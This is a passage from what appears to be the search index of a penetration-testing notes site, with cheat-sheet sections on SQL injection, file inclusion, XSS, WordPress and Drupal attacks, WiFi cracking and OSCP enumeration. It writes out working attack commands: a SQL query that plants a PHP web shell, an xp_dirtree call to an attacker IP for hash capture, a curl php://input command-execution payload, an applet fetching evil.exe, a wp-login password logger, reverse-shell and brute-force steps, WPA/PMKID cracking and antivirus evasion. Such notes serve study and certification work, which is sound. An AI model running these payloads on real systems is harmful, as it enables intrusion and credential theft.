Write to file: select 1 , 2 , 3 , 4 , ?php echo system ( $_GET [ cmd ]); ? , 6 INTO OUTFILE C:\\htdocs\\webroot\\shell.php SQL Server Run Responder and do following to capture hashes: EXEC ( master .. xp_dirtree ( \\\\ (ATTACKER IP ADDRESS)\\foo ) -- Add a trigger to do a malicious action (price 0) Language Specific PHP Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/ ) Practice https://github.com/Audi-1/sqli-labs","title":"SQL Injection"},{"location":"web/#lfi-rfi","text":"Universal LFI for Windows + PHP (using phpinfo): https://rdot.org/forum/showthread.php?t=1134 PHP LFI to arbitrary code execution via rfc1867 file upload temporary files Payloads including uploaded files include data:// or php://input, php://filter pseudo protocol including logs including /proc/self/environ include session files - (usually names /tmp/sess_SESSIONID) include other files created by PHP application C :\\ Windows \\ Temp \\ php 16 - bit - random . TMP without bruteforce can do inc = C : \\ Windows \\ Temp \\ php LFI to RCE RCE with TXT upload Expose .txt file and use a vulnerable include to include the txt file into code (evil.txt.php). PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include) RCE with Logs Use NC to write logs with malicious content to access_logs. Connect and just send the attack string (In user-agent etc.). Then include the log file (local file inclusion) RCE over SQLi Return ?php echo \"test\"? from SQL and see results to check if RCE is possible over SQLi PHP Wrappers File upload with POST data curl - s -- data ? system ( ls -la ); ? http://target.host/web.php?file_path=php://input%00 Base64 encode the LFI http : // X . X . X . X /? page = php : // filter / convert . base64 - encode / resource = ( PHP FILE NAME NO EXTENSION )","title":"LFI / RFI"},{"location":"web/#path-traversal","text":"Payloads .. / .. \\ .. \\ / % 2 e % 2 e % 2f % 252 e % 252 e % 252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 %uff0e%uff0e%u2216 ... / . / ... \\ . \\","title":"Path Traversal"},{"location":"web/#client-side-attacks","text":"","title":"Client Side Attacks"},{"location":"web/#xss","text":"Impact: https://somdev.me/21-things-xss/ Tools https://github.com/s0md3v/XSStrike Payloads Fetch an external resource: https://github.com/aurainfosec/xss_payloads/blob/master/fetch.md Advance XSS Persistence With Oauth: https://github.com/dxa4481/XSSOauthPersistence https://blog.secureideas.com/2018/12/twelve-days-of-xssmas.html XSS Cheat Sheet: https://brutelogic.com.br/blog/xss-cheat-sheet/ http://www.xss-payloads.com/payloads.html XSS via Image XSS via HTTP Response Splitting XSS via Cookie XSS via AngularJS Template Injection","title":"XSS"},{"location":"web/#applet","text":"javac Java.java echo \u201cPermissions: all-\u00ad\u2010permissions\u201d /root/manifest.txt jar cvf Java.jar Java.class added manifest adding: Java.class ( in = 1233 ) ( out = 709 )( deflated 42 % ) keytool -\u00ad\u2010genkey -\u00ad\u2010alias signapplet -\u00ad\u2010keystore mykeystore -\u00ad\u2010keypass mykeypass -\u00ad\u2010storepass password123 jarsigner -\u00ad\u2010keystore mykeystore -\u00ad\u2010storepass password123 -\u00ad\u2010keypass mykeypass -\u00ad\u2010signedjar SignedJava.jar Java.jar signapplet echo applet width= 1 height= 1 id= Java Secure code= Java.class archive= SignedJava.jar param name= 1 value= http://192.168.10.5:80/evil.exe /applet /var/www/java.html","title":"Applet"},{"location":"web/#other","text":"Browser extensions: LinkedIn browser plugin enumeration: https://github.com/dandrews/nefarious-linkedin Browser, VMEscape and Kernel Exploitation (Chrome/Safari): https://github.com/vngkv123/aSiagaming","title":"Other"},{"location":"web/#other_1","text":"Multiple Ways to Exploiting PUT Method - https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/","title":"Other"},{"location":"web/#scenarios","text":"","title":"Scenarios"},{"location":"web/#techniques","text":"","title":"Techniques"},{"location":"web/#discovery-and-enumeration","text":"httprobe - Take a list of domains and probe for working HTTP and HTTPS servers https://github.com/tomnomnom/httprobe cat domains . txt | httprobe | tee alive . txt cat domains . txt | httprobe - p http : 8080 - p https : 4443 | tee alive . txt VHost VHostScan: https://github.com/codingo/VHostScan Subdomains wfuzz -u https:// ( TARGET DOMAIN NAME ) -w /infosec/wordlists/SecLists/Discovery/DNS/subdomains-list-5000.txt -H Host: FUZZ.(TARGET DOMAIN NAME) Files and Folders Gobuster: https://github.com/OJ/gobuster #!/bin/bash set -eu URL = $1 echo super go bustering for super brute: $URL gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/tomcat.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/nginx.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/apache.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/ApacheTomcat.fuzz.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/sharepoint.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/iis.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x txt,php,html,htm DirBuster: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project EroDir: A fast web directory/file enumeration tool written in Rust: https://github.com/PinkP4nther/EroDir DeepSearch: https://github.com/m4ll0k/DeepSearch Filebuster - An extremely fast and flexible web fuzzer: https://github.com/henshin/filebuster Interesting files pyHAWK: Searches the directory of choice for interesting files. Such as database files and files with passwords stored on them: https://github.com/MetaChar/pyHAWK Hidden directories and files as a source of sensitive information about web application: https://medium.com/@_bl4de/hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application-84e5c534e5ad Parameters WFuzz - Identity parameter names: wfuzz - c - z file , burp - parameter - names . txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup Word-lists https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.tx Technologies used: WhatWeb - recognises web technologies ( versions): https://github.com/urbanadventurer/WhatWeb Site Mapping https://code.google.com/archive/p/skipfish/","title":"Discovery and Enumeration"},{"location":"web/#waf-bypasses","text":"Web Application Firewall (WAF) Evasion Techniques: https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 Web Application Firewall (WAF) Evasion Techniques #2: https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0 Web Application Firewall (WAF) Evasion Techniques #3: https://www.secjuice.com/web-application-firewall-waf-evasion/","title":"WAF Bypasses"},{"location":"web/#ssl-tls-attacks","text":"sslyze - Fast and powerful SSL/TLS server scanning library. testssl.sh - Checks any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws Build a valid SSL certificate chain (or fix an incomplete chain): https://github.com/trimstray/mkchain","title":"SSL /TLS Attacks"},{"location":"web/#brute-forcing","text":"W3brute - Automatic Web Application Brute Force Attack Tool: https://github.com/aprilahijriyan/w3brute POST hydra -l ( USERNAME ) -P /path/to/wordlist.txt ( TARGET IP ADDRESS ) \\ http-post-form /URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^ (HTML FORM PASSWORD ATTRIBUTE)=^PASS^ Login=Login:(FAILED LOGIN MESSAGE) GET hydra -l admin -P /pwnt/passwords/wordlists/rockyou.txt ( TARGET IP ADDRESS ) \\ http-get-form /login.php:username=^USER^ password=^PASS^ Login=Login:Please Login|Bad Request","title":"Brute-forcing"},{"location":"web/#fuzzing","text":"Cookies wfuzz -z \\ file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt \\ -b passwd = FUZZ http:// ( TARGET IP ADDRESS ) : ( TARGET PORT )","title":"Fuzzing"},{"location":"web/#defense","text":"Awesome-WAF - A curated list of awesome web-app firewall (WAF) stuff: https://github.com/0xInfection/Awesome-WAF","title":"Defense"},{"location":"web/#cms","text":"","title":"CMS"},{"location":"web/#drupal","text":"Username Enumeration https://raw.githubusercontent.com/weaknetlabs/Penetration-Testing-Grimoire/master/Brute%20Force/Tools/drupalUserEnum.py Password Brute-forcing curl -s http://drupal.site/user/ | grep form_build_id | cut -d \\ -f 6 hydra -l admin -P /wordlists/rockyou.txt ( TARGET DRUPAL IP ) \\ http-form-post /?q=user/:name=admin pass=^PASS^ form_id=user_login form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry PHP Code Execution** Enable\u200b PHP Filter\u200b module on the \u200b Modules\u200b Add content\u200b then to \u200b Article Pasting PHP into the article body Changing the \u200b Text format\u200b to \u200bPHP code\u200b Clicking on \u200b Preview\u200b Tools Droopescan - https://github.com/droope/droopescan","title":"Drupal"},{"location":"web/#wordpress","text":"Version discovery** curl -s 192 .168.56.102/wordpress/ | grep generator curl -s 192 .168.56.102/wordpress/readme.html | grep Version curl -s 192 .168.56.102/wordpress/wp-login.php | grep ver= User enumeration for i in $( seq 1 5 ) ; do curl -sL 192 .168.110.105/wordpress/?author = $i | grep title ; done // When stop-user-enumeration plugin installed curl -i -sL 192.168.56.102/wordpress/?wp-comments-post author=1 | grep title curl -sL 192 .168.56.102/wordpress/?wp-comments-post -d author = 1 | grep title // Rest API ( 4 .7+ ) curl -s http://localhost/wp-json/wp/v2/users Theme and plugin enumeration** /wordpress_site/wp-content/plugins/ /wordpress_site/wp-content/themes/ wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/CMS/wp_plugins.fuzz.txt --hc 404 192 .168.56.104/wordpress/FUZZ nmap -sV -p 80 192 .168.56.102 --script = http-wordpress-enum.nse --script-args = http-wordpress-enum.root = /wordpress/ Enumerate users, plugins and themes wpscan - u http : // 192 . 168 . 110 . 105 / wordpress / - e u , ap , at Password Brute-forcing echo admin users . txt echo wpuser users . txt hydra - L users . txt - P lists / 500 . txt - e nsr 192 . 168 . 110 . 105 http - post - form /wordpress/wp-login.php:log=^USER^ pwd=^PASS^ wp-submit=Log+In testcookie=1:S=Location wpscan --users users.txt -w /root/lists/500.txt -u 192.168.110.105/wordpress/ Privilege escalations searchsploit wordpress escalation Log passwords from wp-login.php file_put_contents ( creds.txt , $ _POST [ log ]. - . $ _POST [ pwd ]) Obtain shell Editing the main header.php script of the WordPress site to contain a reverse shell. Uploading a fake plugin containing a reverse shell. Uploading a fake theme containing a reverse shell. http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip nc - lvp 31337 curl 192 . 168 . 56 . 102 / wordpress / wp - content / themes / fake - theme / header . php Tools WPScan - https://github.com/wpscanteam/wpscan Droopescan - https://github.com/droope/droopescan wpBullet - Static code analysis for WordPress Plugins/Themes","title":"Wordpress"},{"location":"web/#joomla","text":"Tools Droopescan - https://github.com/droope/droopescan","title":"Joomla"},{"location":"web/#moodle","text":"Tools Droopescan - https://github.com/droope/droopescan","title":"Moodle"},{"location":"web/#silverstripe","text":"Tools Droopescan - https://github.com/droope/droopescan","title":"SilverStripe"},{"location":"web/#sharepoint","text":"Important files: / _layouts / viewlsts . aspx \u200b","title":"Sharepoint"},{"location":"web/#tools","text":"BurpSuite Burp Suite Pro Real-life tips tricks: https://www.agarri.fr/docs/HiP2k13-Burp_Pro_Tips_and_Tricks.pdf Extensions Extensions: https://github.com/snoopysecurity/awesome-burp-extensions Turbo Intruder: https://github.com/PortSwigger/turbo-intruder ADAPT is a tool that performs automated Penetration Testing for WebApps https://github.com/secdec/adapt * OTG - IDENT - 004 \u2013 Account Enumeration * OTG - AUTHN - 001 - Testing for Credentials Transported over an Encrypted Channel * OTG - AUTHN - 002 \u2013 Default Credentials * OTG - AUTHN - 003 - Testing for Weak lock out mechanism * OTG - AUTHZ - 001 \u2013 Directory Traversal * OTG - CONFIG - 002 - Test Application Platform Configuration * OTG - CONFIG - 006 \u2013 Test HTTP Methods * OTG - CRYPST - 001 - Testing for Weak SSL / TLS Ciphers , Insufficient Transport Layer Protection * OTG - CRYPST - 002 - Testing for Padding Oracle * OTG - ERR - 001 - Testing for Error Code * OTG - ERR - 002 \u2013 Testing for Stack Traces * OTG - INFO - 002 \u2013 Fingerprinting the Webserver * OTG - INPVAL - 001 - Testing for Reflected Cross site scripting * OTG - INPVAL - 002 - Testing for Stored Cross site scripting * OTG - INPVAL - 003 \u2013 HTTP Verb Tampering * OTG - SESS - 001 - Testing for Session Management Schema * OTG - SESS - 002 \u2013 Cookie Attributes Hawkeye - Project security, vulnerability and general risk highlighting tool: https://github.com/hawkeyesec/scanner-cli Adobe Experience Manager (AEM) hacker toolset: https://github.com/0ang3el/aem-hacker","title":"Tools"},{"location":"web/#practice","text":"https://www.owasp.org/index.php/OWASP_Hacking_Lab http://www.dvwa.co.uk/ http://www.itsecgames.com/ Damn Vulnerable Serverless Application: https://www.owasp.org/index.php/OWASP_DVSA https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA","title":"Practice"},{"location":"wifi/","text":"WIFI Tools Airgeddon: https://github.com/v1s1t0r1sh3r3/airgeddon wifite2 - Attack multiple WEP and WPA encrypted networks at the same time: https://github.com/derv82/wifite2 WIFIPhisher - Phishing attack tool for Wifi networks: https://github.com/wifiphisher/wifiphisher WiFi Wardriving with Android - WiGLE WiFi Wardriving: https://play.google.com/store/apps/details?id=net.wigle.wigleandroid hl=en Quick Reference Capture and crack handshake: aircrack - ng captured . cap \u200b aircrack - ng - a 2 - b BSSID - w wordlist captured . cap \u200b WPA/WPA2 PMKID STEP 1: https://github.com/ZerBea/hcxdumptool https://github.com/aircrack-ng/aircrack-ng STEP 2: Find target BSSID: airodump - ng int STEP 3: Add BSSID in \u2018bssid.txt\u2019 and use \u2018hcxdumptool\u2019: hcxdumptool - i int --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap STEP 4: Extract PMKID into hashcat format for cracking: hcxpcaptool - z wpa2_pmkid_hash . txt pmkid . pcap STEP 5: Crack: hashcat - a 0 - m 16800 - w 4 wpa2_pmkid_hash . txt dict . txt https://mobile.twitter.com/netmux/status/1097908867374215168 WPA enterprise (evil tween attack) https://pwn.no0.be/exploitation/wifi/wpa_enterprise/ https://rootsh3ll.com/evil-twin-attack/ 4 way handshake capture: sudo bettercap -iface wlan0 this will set the interface in monitor mode and start channel hopping on all supported frequencies: wifi . recon on we want our APs sorted by number of clients for this attack, the default sorting would be rssi asc : set wifi.show.sort clients desc every second, clear our view and present an updated list of nearby WiFi networks set ticker.commands clear; wifi.show ticker on other wifi.recon.channel 1 wifi.deauth e0:xx:xx:xx:xx:xx Cracking 4-way handshake: /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx ?d?d?d?d?d?d?d?d Client-less PMKID Attack https://hashcat.net/forum/thread-7717.html PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) # wifi.assoc supports all (or `*`) or a specific BSSID, just like wifi.deauth wifi.assoc all All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file: PMKID Cracking /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid ?d?d?d?d?d?d?d?d References New References Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/ How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a","title":"WIFI"},{"location":"wifi/#wifi","text":"","title":"WIFI"},{"location":"wifi/#tools","text":"Airgeddon: https://github.com/v1s1t0r1sh3r3/airgeddon wifite2 - Attack multiple WEP and WPA encrypted networks at the same time: https://github.com/derv82/wifite2 WIFIPhisher - Phishing attack tool for Wifi networks: https://github.com/wifiphisher/wifiphisher WiFi Wardriving with Android - WiGLE WiFi Wardriving: https://play.google.com/store/apps/details?id=net.wigle.wigleandroid hl=en","title":"Tools"},{"location":"wifi/#quick-reference","text":"Capture and crack handshake: aircrack - ng captured . cap \u200b aircrack - ng - a 2 - b BSSID - w wordlist captured . cap \u200b WPA/WPA2 PMKID STEP 1: https://github.com/ZerBea/hcxdumptool https://github.com/aircrack-ng/aircrack-ng STEP 2: Find target BSSID: airodump - ng int STEP 3: Add BSSID in \u2018bssid.txt\u2019 and use \u2018hcxdumptool\u2019: hcxdumptool - i int --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap STEP 4: Extract PMKID into hashcat format for cracking: hcxpcaptool - z wpa2_pmkid_hash . txt pmkid . pcap STEP 5: Crack: hashcat - a 0 - m 16800 - w 4 wpa2_pmkid_hash . txt dict . txt https://mobile.twitter.com/netmux/status/1097908867374215168 WPA enterprise (evil tween attack) https://pwn.no0.be/exploitation/wifi/wpa_enterprise/ https://rootsh3ll.com/evil-twin-attack/ 4 way handshake capture: sudo bettercap -iface wlan0 this will set the interface in monitor mode and start channel hopping on all supported frequencies: wifi . recon on we want our APs sorted by number of clients for this attack, the default sorting would be rssi asc : set wifi.show.sort clients desc every second, clear our view and present an updated list of nearby WiFi networks set ticker.commands clear; wifi.show ticker on other wifi.recon.channel 1 wifi.deauth e0:xx:xx:xx:xx:xx Cracking 4-way handshake: /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx ?d?d?d?d?d?d?d?d Client-less PMKID Attack https://hashcat.net/forum/thread-7717.html PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) # wifi.assoc supports all (or `*`) or a specific BSSID, just like wifi.deauth wifi.assoc all All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file: PMKID Cracking /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid ?d?d?d?d?d?d?d?d","title":"Quick Reference"},{"location":"wifi/#references","text":"New References Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/ How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a","title":"References"},{"location":"windows-active-directory/","text":"","title":"Windows active directory"},{"location":"windows-issues/","text":"","title":"Windows issues"},{"location":"windows/","text":"","title":"Windows"},{"location":"certifications/cissp/","text":"CISSP","title":"CISSP"},{"location":"certifications/cissp/#cissp","text":"","title":"CISSP"},{"location":"certifications/osce/","text":"OSCE New References https://tulpa-security.com/2017/07/18/288/ https://m101.github.io/binholic/2018/04/28/yet-another-osce-review.html https://github.com/FabioBaroni/awesome-exploit-development Summarized References https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/ Tools Olly Debugger WinDBG Immunity Debugger with Mona CFF Explorer LordPE DevCPP nasm VulnServer Training Open Security Training Introductory Intel x86: Architecture, Assembly, Applications, Alliteration Introduction To Software Exploits Exploits 2: Exploitation in the Windows Environment Exploit development Corelan Exploit Writing Tutorial Series Exploit Writing Tutorial Part 1 \u2013 Stack Based Overflows Buffer Overflows in the Microsoft Windows\u00ae Environment Basic Reverse Engineering with Immunity Debugger Egg hunting \"Safely Searching Process Virtual Address Space\" By Skape Egg Hunters \u2013 Fuzzy Security Egg Hunters \u2013 A Twist In Buffer Overflows Fuzzing 15 Minute Guide To Fuzzing SkyDogCon 2015: Fuzzing Basics \u2013 Scott M An Introduction to Fuzzing: Using fuzzers (SPIKE) to find vulnerabilities Practice Vulnserver \u2013 Fuzzing with Spike Bypassing exploit mitigation: Bypassing ASLR/DEP Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Exploit Dev 101: Bypassing ASLR on Windows Bypassing ASLR and DEP on Windows 7: The Audio Converter Case Shellcoding: Exploit Writing Tutorial Part 9 \u2013 Introduction To Win32 Shellcoding ShellCode By Hand http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/ Web app security Web Application Pentesting \u2013 Webpwnized File Inclusion Vulnerabilities Guide Book on Cross Site Scripting Finding vulnerabilities in Web Applications AV evasion: https://resources.infosecinstitute.com/bypassing-antivirus/ https://www.youtube.com/watch?v=tBY46vs0ptE https://dl.packetstormsecurity.net/papers/bypass/bypassing-av.pdf https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Practice VulnServer Walk-throughs TRUN GMON HTER KSTET CTF CTP Registration: http://fc4.me/","title":"OSCE"},{"location":"certifications/osce/#osce","text":"","title":"OSCE"},{"location":"certifications/osce/#new-references","text":"https://tulpa-security.com/2017/07/18/288/ https://m101.github.io/binholic/2018/04/28/yet-another-osce-review.html https://github.com/FabioBaroni/awesome-exploit-development","title":"New References"},{"location":"certifications/osce/#summarized-references","text":"https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/","title":"Summarized References"},{"location":"certifications/osce/#tools","text":"Olly Debugger WinDBG Immunity Debugger with Mona CFF Explorer LordPE DevCPP nasm VulnServer","title":"Tools"},{"location":"certifications/osce/#training","text":"","title":"Training"},{"location":"certifications/osce/#open-security-training","text":"Introductory Intel x86: Architecture, Assembly, Applications, Alliteration Introduction To Software Exploits Exploits 2: Exploitation in the Windows Environment","title":"Open Security Training"},{"location":"certifications/osce/#exploit-development","text":"Corelan Exploit Writing Tutorial Series Exploit Writing Tutorial Part 1 \u2013 Stack Based Overflows Buffer Overflows in the Microsoft Windows\u00ae Environment Basic Reverse Engineering with Immunity Debugger","title":"Exploit development"},{"location":"certifications/osce/#egg-hunting","text":"\"Safely Searching Process Virtual Address Space\" By Skape Egg Hunters \u2013 Fuzzy Security Egg Hunters \u2013 A Twist In Buffer Overflows","title":"Egg hunting"},{"location":"certifications/osce/#fuzzing","text":"15 Minute Guide To Fuzzing SkyDogCon 2015: Fuzzing Basics \u2013 Scott M An Introduction to Fuzzing: Using fuzzers (SPIKE) to find vulnerabilities","title":"Fuzzing"},{"location":"certifications/osce/#practice","text":"Vulnserver \u2013 Fuzzing with Spike","title":"Practice"},{"location":"certifications/osce/#bypassing-exploit-mitigation","text":"Bypassing ASLR/DEP Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Exploit Dev 101: Bypassing ASLR on Windows Bypassing ASLR and DEP on Windows 7: The Audio Converter Case","title":"Bypassing exploit mitigation:"},{"location":"certifications/osce/#shellcoding","text":"Exploit Writing Tutorial Part 9 \u2013 Introduction To Win32 Shellcoding ShellCode By Hand http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/","title":"Shellcoding:"},{"location":"certifications/osce/#web-app-security","text":"Web Application Pentesting \u2013 Webpwnized File Inclusion Vulnerabilities Guide Book on Cross Site Scripting Finding vulnerabilities in Web Applications","title":"Web  app security"},{"location":"certifications/osce/#av-evasion","text":"https://resources.infosecinstitute.com/bypassing-antivirus/ https://www.youtube.com/watch?v=tBY46vs0ptE https://dl.packetstormsecurity.net/papers/bypass/bypassing-av.pdf https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/","title":"AV evasion:"},{"location":"certifications/osce/#practice_1","text":"","title":"Practice"},{"location":"certifications/osce/#vulnserver-walk-throughs","text":"TRUN GMON HTER KSTET","title":"VulnServer Walk-throughs"},{"location":"certifications/osce/#ctf","text":"CTP Registration: http://fc4.me/","title":"CTF"},{"location":"certifications/oscp/0-cheatsheet/","text":"Enumeration TCP nmap - sS - sV - sC - n [ IP ] nmap - vv - Pn - A - sC - sS - T 4 - p - 10 . 0 . 0 . 1 UDP nmap - sU - sV - n --top-ports 200 [IP] SNMP (UDP 161) snmp - check - t [ IP ] - c public SMTP nmap \u2013 script = smtp - commands , smtp - enum - users , smtp - vuln - cve2010 - 4344 , smtp - vuln - cve2011 - 1720 , smtp - vuln - cve2011 - 1764 - p 25 10 . 0 . 0 . 1 SNMP snmpwalk - c public - v1 10 . 0 . 0 . 0 SMB (TCP 139/TCP 445) enum4linux [ IP ] WebDav davtest - url http ( s ) : //[ IP ] FTP: ftp [ IP ] Username : anonymous Password : anonymous nmap \u2013 script = ftp - anon , ftp - bounce , ftp - libopie , ftp - proftpd - backdoor , ftp - vsftpd - backdoor , ftp - vuln - cve2010 - 4221 , tftp - enum - p 21 10 . 0 . 0 . 1 SMB (anonymous) smbclient - L \\\\ [ IP ] Username : root Password : None enum4linux 10.0.0.1 nmap \u2013 script = smb - enum - domains . nse , smb - enum - groups . nse , smb - enum - processes . nse , smb - enum - sessions . nse , smb - enum - shares . nse , smb - enum - users . nse , smb - ls . nse , smb - mbenum . nse , smb - os - discovery . nse , smb - print - text . nse , smb - psexec . nse , smb - security - mode . nse , smb - server - stats . nse , smb - system - info . nse , smb - vuln - conficker . nse , smb - vuln - cve2009 - 3103 . nse , smb - vuln - ms06 - 025 . nse , smb - vuln - ms07 - 029 . nse , smb - vuln - ms08 - 067 . nse , smb - vuln - ms10 - 054 . nse , smb - vuln - ms10 - 061 . nse , smb - vuln - regsvc - dos . nse , smbv2 - enabled . nse 10 . 0 . 0 . 1 MySQL nmap - sV - Pn - vv \u2013 script = mysql - audit , mysql - databases , mysql - dump - hashes , mysql - empty - password , mysql - enum , mysql - info , mysql - query , mysql - users , mysql - variables , mysql - vuln - cve2012 - 2122 10 . 0 . 0 . 1 - p 3306 Web Applications Structure Discovery dirb http : // 10 . 0 . 0 . 1 / usr / share / wordlists / dirb / common . txt Vulnerability Discovery nikto - h http ( s ) : //[ IP ] : [ PORT ]/[ DIRECTORY ] Password Attacks https://hashkiller.co.uk john hashes . txt hashcat - m 500 - a 0 - o output . txt \u2013 remove hashes . txt / usr / share / wordlists / rockyou . txt hydra 10 . 0 . 0 . 1 http - post - form \u201c / admin . php : target = auth mode = login user =^ USER ^ password =^ PASS ^ : invalid \u201d - P / usr / share / wordlists / rockyou . txt - l admin hydra - l admin - P / usr / share / wordlists / rockyou . txt - o results . txt ssh : // 10 . 0 . 0 . 1 Tunneling Tunnels traffic through 10.0.0.1 and makes a route for all traffic destined for 10.10.10.0/24 through your sshuttle tunnel. sshuttle - r root @10.0.0.1 10.10.10.0 / 24 sshuttle - l ( any port ) - r root @10.10.0.1 10.10.0.0 / 24 AV Bypassing root @kali : ~/ Hyperion - 1.0 # wine hyperion . exe .. / backdoor . exe .. / backdoor_mutation . exe https://github.com/furrukhtaj/Enumerator Scripts from awansec https://awansec.com/oscp-review.html","title":"Enumeration"},{"location":"certifications/oscp/0-cheatsheet/#enumeration","text":"","title":"Enumeration"},{"location":"certifications/oscp/0-cheatsheet/#tcp","text":"nmap - sS - sV - sC - n [ IP ] nmap - vv - Pn - A - sC - sS - T 4 - p - 10 . 0 . 0 . 1","title":"TCP"},{"location":"certifications/oscp/0-cheatsheet/#udp","text":"nmap - sU - sV - n --top-ports 200 [IP]","title":"UDP"},{"location":"certifications/oscp/0-cheatsheet/#snmp-udp-161","text":"snmp - check - t [ IP ] - c public","title":"SNMP (UDP 161)"},{"location":"certifications/oscp/0-cheatsheet/#smtp","text":"nmap \u2013 script = smtp - commands , smtp - enum - users , smtp - vuln - cve2010 - 4344 , smtp - vuln - cve2011 - 1720 , smtp - vuln - cve2011 - 1764 - p 25 10 . 0 . 0 . 1","title":"SMTP"},{"location":"certifications/oscp/0-cheatsheet/#snmp","text":"snmpwalk - c public - v1 10 . 0 . 0 . 0","title":"SNMP"},{"location":"certifications/oscp/0-cheatsheet/#smb-tcp-139tcp-445","text":"enum4linux [ IP ]","title":"SMB (TCP 139/TCP 445)"},{"location":"certifications/oscp/0-cheatsheet/#webdav","text":"davtest - url http ( s ) : //[ IP ]","title":"WebDav"},{"location":"certifications/oscp/0-cheatsheet/#ftp","text":"ftp [ IP ] Username : anonymous Password : anonymous nmap \u2013 script = ftp - anon , ftp - bounce , ftp - libopie , ftp - proftpd - backdoor , ftp - vsftpd - backdoor , ftp - vuln - cve2010 - 4221 , tftp - enum - p 21 10 . 0 . 0 . 1","title":"FTP:"},{"location":"certifications/oscp/0-cheatsheet/#smb-anonymous","text":"smbclient - L \\\\ [ IP ] Username : root Password : None enum4linux 10.0.0.1 nmap \u2013 script = smb - enum - domains . nse , smb - enum - groups . nse , smb - enum - processes . nse , smb - enum - sessions . nse , smb - enum - shares . nse , smb - enum - users . nse , smb - ls . nse , smb - mbenum . nse , smb - os - discovery . nse , smb - print - text . nse , smb - psexec . nse , smb - security - mode . nse , smb - server - stats . nse , smb - system - info . nse , smb - vuln - conficker . nse , smb - vuln - cve2009 - 3103 . nse , smb - vuln - ms06 - 025 . nse , smb - vuln - ms07 - 029 . nse , smb - vuln - ms08 - 067 . nse , smb - vuln - ms10 - 054 . nse , smb - vuln - ms10 - 061 . nse , smb - vuln - regsvc - dos . nse , smbv2 - enabled . nse 10 . 0 . 0 . 1","title":"SMB (anonymous)"},{"location":"certifications/oscp/0-cheatsheet/#mysql","text":"nmap - sV - Pn - vv \u2013 script = mysql - audit , mysql - databases , mysql - dump - hashes , mysql - empty - password , mysql - enum , mysql - info , mysql - query , mysql - users , mysql - variables , mysql - vuln - cve2012 - 2122 10 . 0 . 0 . 1 - p 3306","title":"MySQL"},{"location":"certifications/oscp/0-cheatsheet/#web-applications","text":"","title":"Web 